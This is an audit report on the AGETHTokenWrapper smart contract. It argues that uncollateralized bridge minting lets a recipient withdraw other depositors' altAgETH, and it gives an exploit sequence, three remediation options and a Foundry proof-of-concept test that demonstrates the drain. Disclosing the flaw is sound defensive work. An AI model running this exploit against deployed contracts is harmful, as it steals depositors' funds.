Audit Report

## Title
Uncollateralized `mint()` enables bridge recipients to drain depositor altAgETH before `depositBridgerAssets()` is called — (`contracts/agETH/AGETHTokenWrapper.sol`)

## Summary

`AGETHTokenWrapper.mint()` issues wrapped agETH to bridge recipients without any immediate altAgETH collateral, while `_withdraw()` draws from the same shared altAgETH pool with no solvency check. Because both bridge-minted and deposit-backed wrapped tokens are fungible, a bridge recipient can call `withdraw()` during the window between `mint()` and `depositBridgerAssets()`, draining altAgETH deposited by regular users and leaving those users unable to redeem their tokens.

## Finding Description

`mint()` (lines 165–167) calls `_mint(_to, _amount)` directly with no `safeTransferFrom`, increasing `totalSupply` without adding any altAgETH to the contract: [1](#0-0) 

`_deposit()` (lines 125–131) does the opposite — it pulls altAgETH in via `safeTransferFrom` and mints 1:1: [2](#0-1) 

`_withdraw()` (lines 111–119) burns wrapped tokens and calls `safeTransfer` for the exact requested amount with **no check** that `altAgETH.balanceOf(address(this)) >= _amount`: [3](#0-2) 

The design intent is that `depositBridgerAssets()` (lines 143–151) is called by `BRIDGER_ROLE` to back bridge-minted tokens after the fact: [4](#0-3) 

There is no atomicity or ordering enforcement between `mint()` and `depositBridgerAssets()`. The `maxAmountToDepositBridgerAsset()` view function (lines 90–101) confirms the design explicitly tracks the undercollateralized gap (`totalSupply - balance`), but nothing prevents withdrawals during that gap: [5](#0-4) 

**Exploit path:**
1. User A calls `deposit(altAgETH, 100e18)` → contract holds 100e18 altAgETH, `totalSupply = 100e18`.
2. MINTER_ROLE calls `mint(userB, 200e18)` (normal bridge operation) → `totalSupply = 300e18`, contract still holds 100e18 altAgETH.
3. User B calls `withdraw(altAgETH, 100e18)` → burns 100e18, `safeTransfer` succeeds, contract now holds 0 altAgETH.
4. User A calls `withdraw(altAgETH, 100e18)` → `safeTransfer` reverts (balance = 0); User A's 100e18 altAgETH has been transferred to User B.

User A still holds their wrapped tokens (the burn reverts with the transfer), but the underlying altAgETH has been taken by User B. User A's funds remain frozen until the BRIDGER_ROLE deposits additional collateral — collateral that was never intended to cover User A's deposit.

## Impact Explanation

**Critical — Direct theft of user funds.** User B (an unprivileged bridge recipient) receives User A's deposited altAgETH. User A's original altAgETH is gone from the contract; recovery requires the BRIDGER_ROLE to deposit *extra* altAgETH beyond what the bridge flow requires, which is not guaranteed. This matches the allowed impact: *Direct theft of any user funds, whether at-rest or in-motion*.

## Likelihood Explanation

High. `mint()` is the normal cross-chain bridge path — it is called on every L1→L2 bridge transfer. The undercollateralized window between `mint()` and `depositBridgerAssets()` is a routine operational state, not an edge case. Any bridge recipient (unprivileged) can call `withdraw()` during this window. No malicious MINTER_ROLE is required; the MINTER_ROLE acts correctly per its design. The race is inherent to the architecture.

## Recommendation

**Option A (solvency check in `_withdraw`):** Before burning, revert if `ERC20Upgradeable(_asset).balanceOf(address(this)) < _amount`. This prevents withdrawals that would drain depositor funds, at the cost of temporarily blocking bridge recipients until collateral arrives.

**Option B (atomic collateralization):** Require `depositBridgerAssets()` to be called in the same transaction as `mint()` (e.g., via a single bridge callback), so `totalSupply` never exceeds the altAgETH balance.

**Option C (separate accounting):** Track bridge-minted supply separately from deposit-backed supply, and restrict `withdraw()` for bridge-minted tokens until the corresponding collateral has been deposited via `depositBridgerAssets()`.

## Proof of Concept

```solidity
// Foundry test — run against a local fork
function testTheftViaUncollateralizedMint() public {
    // Setup: give userA altAgETH and approve wrapper
    altAgETH.mint(userA, 100e18);
    vm.prank(userA);
    altAgETH.approve(address(wrapper), 100e18);

    // Step 1: userA deposits 100e18 altAgETH
    vm.prank(userA);
    wrapper.deposit(address(altAgETH), 100e18);
    assertEq(altAgETH.balanceOf(address(wrapper)), 100e18);
    assertEq(wrapper.totalSupply(), 100e18);

    // Step 2: MINTER_ROLE mints 200e18 to userB (normal bridge op, no collateral yet)
    vm.prank(minterRole);
    wrapper.mint(userB, 200e18);
    assertEq(wrapper.totalSupply(), 300e18);
    assertEq(altAgETH.balanceOf(address(wrapper)), 100e18); // undercollateralized

    // Step 3: userB withdraws 100e18 — drains the pool
    vm.prank(userB);
    wrapper.withdraw(address(altAgETH), 100e18);
    assertEq(altAgETH.balanceOf(address(wrapper)), 0);
    assertEq(altAgETH.balanceOf(userB), 100e18); // userB holds userA's altAgETH

    // Step 4: userA tries to withdraw — reverts, funds stolen
    vm.prank(userA);
    vm.expectRevert();
    wrapper.withdraw(address(altAgETH), 100e18);
    // userA still holds 100e18 wrapped tokens but cannot redeem them
}
```

    function maxAmountToDepositBridgerAsset(address _asset) public view returns (uint256) {
        if (!allowedTokens[_asset]) return 0;

        // get totalSupply of wrapped agETH minted
        uint256 agETHSupply = totalSupply();

        return agETHSupply - balanceOfAssetInWrapper;
    }
